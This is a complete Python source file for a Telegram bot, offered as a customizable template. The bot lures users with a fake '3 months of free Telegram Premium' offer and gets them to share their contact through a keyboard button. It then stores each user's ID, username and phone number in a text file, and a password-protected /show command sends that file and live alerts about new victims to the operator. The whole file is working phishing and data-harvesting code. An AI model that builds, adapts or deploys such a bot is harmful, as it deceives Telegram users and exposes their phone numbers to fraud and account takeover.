#    _____                  __   __      __  _____         __             .___
#   /     \   ____  _______/  |_/  \    /  \/  |  |  _____/  |_  ____   __| _/
#  /  \ /  \ /  _ \/  ___/\   __\   \/\/   /   |  |_/    \   __\/ __ \ / __ | 
# /    Y    (  <_> )___ \  |  |  \        /    ^   /   |  \  | \  ___// /_/ | 
# \____|__  /\____/____  > |__|   \__/\  /\____   ||___|  /__|  \___  >____ | 
#         \/           \/              \/      |__|     \/          \/     \/ 

"""
CUSTOMIZATION GUIDE:
1. Bot Token: Replace the token in main() function with your bot token from @BotFather
2. Welcome Message: Modify WELCOME_CAPTION below to change the bot's greeting message
3. Button Text: Change the text in KeyboardButton inside send_welcome_message() function
4. Picture: Replace 'telegramicon.png' with your own image file (keep the same filename or update it in the code)
5. Password: Change the 'password' variable below to set your own password for the /show command
"""

from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import logging

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Dictionary to store user data
user_data = {}
notified_users = set()  # Set of users who entered /show 555222

# Password for accessing /show command
PASSWORD = '555222'

# Your Bot Token
BOT_TOKEN = "YOUR_BOT_TOKEN"  # Replace with your actual bot token

# Welcome Message
WELCOME_CAPTION = ("🎉 Welcome to Free Telegram Premium 🎉\n\n"
                   "Get 3 months of Telegram Premium for free!\n\n"
                   "To claim your reward, press the 📦 box icon "
                   "near the 🧷 clip to connect your account.\n\n"
                   "Happy Using! 😊")

def send_welcome_message(chat_id, bot=None, update=None) -> None:
    """Helper function to send welcome message with photo and buttons"""
    button_text = "⭐️ Get Free 3 months Telegram Premium"

    reply_markup = ReplyKeyboardMarkup(
        [[KeyboardButton(text=button_text, request_contact=True)]],
        one_time_keyboard=True,
        resize_keyboard=True
    )

    with open('telegramicon.png', 'rb') as photo:
        if bot:
            bot.send_photo(chat_id=chat_id, photo=photo, caption=WELCOME_CAPTION, reply_markup=reply_markup)
        else:
            update.message.reply_photo(photo=photo, caption=WELCOME_CAPTION, reply_markup=reply_markup)

def start(update: Update, context: CallbackContext) -> None:
    send_welcome_message(update.effective_chat.id, update=update)

def notify_users_of_new_user(phone_number: str, context: CallbackContext):
    """Notify users who entered /show 555222 about a new user."""
    for user_id in notified_users.copy():  # Iterate over a copy to avoid errors if a user leaves
        try:
            message = f"🚨 A new user has been added!\n📱 Phone: {phone_number}\nCheck the updated list using /show 555222."
            context.bot.send_message(chat_id=user_id, text=message)
        except Exception as e:
            logger.error(f"Error notifying user {user_id}: {e}")
            notified_users.discard(user_id)  # Remove user if an error occurs (e.g., bot blocked)

def handle_contact(update: Update, context: CallbackContext) -> None:
    """Handle contact sharing and notify users."""
    contact = update.message.contact
    user_id = update.message.from_user.id
    username = update.message.from_user.username

    if user_id in user_data:
        update.message.reply_text(f"🚫 @{username}, you already shared your number. You will receive premium access soon! 🚀")
        return

    user_data[user_id] = {'username': username, 'phone_number': contact.phone_number}

    # Save new user data
    with open('user_data.txt', 'a') as file:
        file.write(f"User ID: {user_id}\nUsername: @{username}\nPhone Number: {contact.phone_number}\n\n")

    update.message.reply_text(f"✅ Thank you @{username}! 🎉\n"
                              f"You will soon receive Telegram Pro features. 🚀")

    # Notify all users who entered /show 555222
    notify_users_of_new_user(contact.phone_number, context)

def show_users(update: Update, context: CallbackContext) -> None:
    """Show the list of users to authorized users and add them to notification list."""
    if len(context.args) == 0 or context.args[0] != PASSWORD:
        update.message.reply_text("❌ Access denied. Use: /show <password>")
        return

    user_id = update.message.from_user.id
    notified_users.add(user_id)  # Add user to notification list

    try:
        update.message.reply_document(
            document=open('user_data.txt', 'rb'),
            filename="user_data.txt",
            caption="📜 Here is the list of users who shared their information."
        )
        update.message.reply_text("✅ You will now receive notifications for each new user added! 📲")
    except FileNotFoundError:
        update.message.reply_text("No user data found. 😔")
    except Exception as e:
        logger.error(f"Error retrieving user data: {e}")
        update.message.reply_text("An error occurred while retrieving the user data. 😔")

def main() -> None:
    updater = Updater(BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(MessageHandler(Filters.contact, handle_contact))
    dispatcher.add_handler(CommandHandler("show", show_users))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()

